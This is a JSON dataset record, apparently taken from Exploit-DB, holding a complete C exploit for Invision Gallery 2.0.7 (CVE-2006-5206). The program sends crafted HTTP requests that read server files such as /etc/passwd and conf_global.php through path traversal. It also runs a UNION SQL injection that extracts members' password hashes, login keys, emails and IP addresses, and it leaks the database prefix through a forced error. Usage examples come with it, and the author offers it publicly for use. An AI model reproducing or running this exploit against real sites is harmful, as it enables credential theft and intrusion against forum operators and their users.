{
  "id": "2473",
  "title": "Invision Gallery 2.0.7 - &#039;readfile()&#039; / SQL Injection",
  "cve": "CVE-2006-5206",
  "vuln_type": "sqli",
  "code": "/*\r\n     _  _     _ _ _  __     _      _   _\r\n    | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___\r\n    | __ / -_) | | ' <| ' \\| / _` | ' \\  _(_-<\r\n    |_||_\\___|_|_|_|\\_\\_||_|_\\__, |_||_\\__/__/\r\n      hellknights.void.ru    |___/  \r\n                 (c)oded by _1nf3ct0r_\r\n\r\n Invision Gallery => 2.0.7 ReadFile() & SQL injection exploit\r\n \r\n+-------------+\r\n|   Uzage:    |\r\n+-------------+\r\n[+] ReadFile():\r\n  - syntax:\r\n  readfile 1 <host> <pathtoindex> <localfile> \r\n  readfile 2 <host> <pathtoindex> <localfile>  // try it if readfile[1] failed ;)\r\n   - params: \r\n  <localfile> -  path to local file (../file), for example: ../../../../../etc/passwd\r\n   s0, if u want to get local path to IPB try this: ../../hellknightscrewxploit :) \r\n   - examples:\r\n   readfile 1 asd.ru index.php ../../../../../../etc/passwd\r\n   readfile 1 asd.ru forum/index.php ../../conf_global.php\r\n   readfile 1 asd.ru forum/index.php ../../conf_global.php%00\r\n   \r\n[+] SQL-injection:\r\n  - syntax\r\n  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>\r\n  getprefix <host> <pathtoindex>   // get database prefix from IPB error :) \r\n  - params:\r\n  <member_id> -  member's id for SQL-injection result, for example: 1\r\n  <column>    -  ipb members' column to get. for example: ip_adress, email.\r\n  <table>     -  ipb table to use. for example: member\r\n  <prefix>    -  database prefix. \r\n  - examples:\r\n  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \r\n  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\r\n  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\r\n  \r\n[~] sorry, but i`m too lazy 2 optimize this c0de... \r\n[~] Music: Orbital - Halcyon and On and On (OST Hackers) :) \r\n[~] compiled with LCC without any warnings\r\n\r\nGr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team \r\n             itz public c0de n0w, have phun :> \r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <winsock2.h>\r\n\r\nDWORD resolve(char *host)\r\n{\r\n    DWORD ret = 0;\r\n    struct hostent * hp = gethostbyname(host);\r\n    if (!hp) ret = inet_addr(host);\r\n    if ((!hp)&&(ret == INADDR_NONE)) return 0;\r\n    if (hp != NULL) memcpy((void*)&ret, hp->h_addr,hp->h_length);\r\n    return ret;\r\n}\r\n\r\nint Exploit(char * sendbuffer, char * mode, char * host)\r\n{\r\n\tchar recvbuffer[10024]; char * temp; \r\n\tmemset(recvbuffer,0,10024);\r\n\r\n\tSOCKET s = socket(AF_INET,SOCK_STREAM,0);\r\n\tSOCKADDR_IN webaddr;\r\n\t\twebaddr.sin_addr.S_un.S_addr = resolve(host);\r\n\t\twebaddr.sin_family = AF_INET;\r\n\t\twebaddr.sin_port = htons(80);\r\n\tif(connect(s, (struct sockaddr *)&webaddr,sizeof(SOCKADDR_IN))) return -1;\r\n\tsend(s, sendbuffer, strlen(sendbuffer),0);\r\n\t\r\n\tint i, j;\r\n\twhile(i = recv(s,recvbuffer+strlen(recvbuffer),1,0)) \r\n\tfor(int i = 0; recvbuffer[i]!=0; ++i)\r\n\t{\r\n\t\tif((recvbuffer[i]=='\\r')&&(recvbuffer[i+1]=='\\n')&&\r\n\t\t\t(recvbuffer[i+2]=='\\r')&&(recvbuffer[i+3]=='\\n'))\r\n\t\t{temp = (char*)&recvbuffer[i] + 4;break;}\r\n\t}\r\n\t\r\n\t\r\n\tif(strcmp(mode,\"readfile\")==0)\r\n\t{\r\n\tprintf(\"\\n [+] Exploit Result:\\n\\n%s\", temp);\r\n\treturn 0;\r\n\t}\r\n\t\r\n\tif(strcmp(mode,\"sqlinject\")==0)\r\n\t{\t\t\r\n\tchar * token = NULL; char * injected = NULL; char * parse = NULL;\r\n    token = strtok(temp, \"=\"); \r\n\ttoken = strtok(NULL, \"=\");\r\n\ttoken = strtok(NULL, \"&\");\r\n\ttoken = strtok(NULL, \"&\");\r\n\tfor(int j = 0; j < 2; j++)\r\n\t\t{\r\n    \ttoken = strtok(NULL, \"&\");\r\n\t    if(j==1){ injected = token; printf(\"\\n [+] Exploit Result:\\n\\n%s\", injected); }\r\n\t\t}\r\n\r\n\t} else { printf(\"\\n[-] some error. change MODE param\\n\"); return 0; } \r\n\treturn 0;\r\n}\r\n\r\nint main(int argc,char * argv[])\r\n{\r\nWSADATA wsaData;\r\nWSAStartup(MAKEWORD(2,2),&wsaData);\r\n\r\n\t\tprintf(\"\\n ...............................................................\\n\");\r\n        printf(\"  Invision Gallery 2.0.7 ReadFile() & SQL injection exploit       \\n\");\r\n        printf(\"         (c)oded by _1nf3ct0r_ // Hell Knights Crew               \\n\");\r\n\t\tprintf(\"               http://hellknights.void.ru/                        \\n\");\r\n\t\tprintf(\"  Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team   \\n\");\r\n\t\tprintf(\" ...............................................................  \\n\");\r\n\t\t\r\n\tif (argc == 1) {\r\n\r\nprintf(\"\\n\\n [+] ReadFile():\\n\");\r\nprintf(\"  - syntax:\\n\");\r\nprintf(\"  readfile 1 <host> <pathtoindex> <localfile> \\n\");\r\nprintf(\"  readfile 2 <host> <pathtoindex> <localfile>   -- try it 1f readfile[1] failed \\n\");\r\nprintf(\"  - params: \\n\");\r\nprintf(\"  <localfile> -  path to local file (../file), f0r example: ../../../../../etc/passwd\\n\");\r\nprintf(\"  s0, 1f u want to get local path to IPB 7ry th1s: ../../hellknightscrewxploit  \\n\");\r\nprintf(\"  - examples:\\n\");\r\nprintf(\"  readfile 1 asd.ru index.php ../../../../../../etc/passwd\\n\");\r\nprintf(\"  readfile 1 asd.ru forum/index.php ../../conf_global.php\\n\");\r\nprintf(\"  readfile 1 asd.ru forum/index.php ../../conf_global.php%00\\n\\n\\n\");\r\nprintf(\" [+] SQL-injection:\\n\");\r\nprintf(\"  - syntax\\n\");\r\nprintf(\"  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>\\n\");\r\nprintf(\"  getprefix <host> <pathtoindex>   -- get database prefix from IPB error  \\n\");\r\nprintf(\"  - params:\\n\");\r\nprintf(\"  <member_id> -  member's id for SQL-injection result, for example: 1\\n\");\r\nprintf(\"  <column>    -  ipb members' column to get. for example: ip_adress, email.\\n\");\r\nprintf(\"  <table>     -  ipb table to use. f0r example: member\\n\");\r\nprintf(\"  <prefix>    -  database prefix. \\n\");\r\nprintf(\"  - examples:\\n\");\r\nprintf(\"  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \\n\");\r\nprintf(\"  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\\n\");\r\nprintf(\"  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\\n\\n\");\r\n\t\t           return 1;\r\n\t               }\r\n\t\r\nchar * mode = argv[1];\r\n\r\n\r\n// --- readfile() exploit --- //\r\nif (strcmp(mode,\"readfile\")==0)\r\n{ \r\nchar * type = argv[2];\r\nchar * path = NULL; path = argv[4];\r\nchar * localfile = argv[5];\r\nchar * host = argv[3]; \r\n\tif (strcmp(type,\"1\")==0)\r\n\t{\r\n\tchar exploit[1024]; \r\n\tstrcpy(exploit, \"GET /\"); \r\n\tstrcat(exploit, path); \r\n\tstrcat(exploit, \"?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=\");\r\n\tstrcat(exploit, localfile);\r\n    strcat(exploit, \" HTTP/1.0\\r\\nHost: \");\r\n\tstrcat(exploit, host); \r\n\tstrcat(exploit, \"\\r\\n\\r\\n\"); \r\nExploit(exploit, \"readfile\", host);\r\n\r\n\t} \r\n\telse if (strcmp(type,\"2\")==0)\r\n\t{\r\n\tchar exploit[1024]; \r\n\tstrcpy(exploit, \"GET /\"); \r\n\tstrcat(exploit, path); \r\n\tstrcat(exploit, \"?act=gallery&code=viewimage&img=index.gif&dir=\");\r\n\tstrcat(exploit, localfile);\r\n    strcat(exploit, \" HTTP/1.0\\r\\nHost: \");\r\n\tstrcat(exploit, host); \r\n\tstrcat(exploit, \"\\r\\n\\r\\n\"); \r\nExploit(exploit, \"readfile\", host);\r\n\t}\r\n\r\n// --- sql-injection exploit --- //\r\n} \r\nif(strcmp(mode,\"sqlinject\")==0)\r\n{\r\nchar * host = argv[2]; \r\nchar * path = argv[3];\r\nchar * prefix = argv[5];\r\nchar * column = argv[4];\r\nchar * table = argv[6];\r\nchar * id = argv[7];\r\n\r\n\tchar exploit[1024]; \r\n\tstrcpy(exploit, \"GET /\"); \r\n\tstrcat(exploit, path); \r\n\tstrcat(exploit, \"?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20union%20select%201,\");\r\n\tstrcat(exploit, column);\r\n\tstrcat(exploit, \",1,1,1,1,1,1,1,1%20FROM%20\");\r\n\tstrcat(exploit, prefix);\r\n\tstrcat(exploit, table);\r\n\tstrcat(exploit, \"%20WHERE%20id=\");\r\n\tstrcat(exploit, id);\r\n\tstrcat(exploit, \"/*31337*/\");\r\n    strcat(exploit, \" HTTP/1.0\\r\\nHost: \");\r\n\tstrcat(exploit, host); \r\n\tstrcat(exploit, \"\\r\\n\\r\\n\"); \r\n    Exploit(exploit, \"sqlinject\", host);\r\n} \r\nif (strcmp(mode,\"getprefix\")==0)\r\n{ \r\nchar * path = argv[3];\r\nchar * host = argv[2]; \r\n\tchar exploit[1024]; \r\n\tstrcpy(exploit, \"GET /\"); \r\n\tstrcat(exploit, path); \r\n\tstrcat(exploit, \"?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20hellknightscrew\");\r\n    strcat(exploit, \" HTTP/1.0\\r\\nHost: \");\r\n\tstrcat(exploit, host); \r\n\tstrcat(exploit, \"\\r\\n\\r\\n\"); \r\nprintf(\"\\n\\n\\n[!] u can get database prefix from this error. example: SELECT * FROM <PREFIX>gallery_albums\\n\\n\");\r\nExploit(exploit, \"readfile\", host);\r\n}\r\n\r\nWSACleanup();\r\n\treturn 0;\r\n}\r\n\r\n// milw0rm.com [2006-10-03]",
  "url": "https://www.exploit-db.com/exploits/2473"
}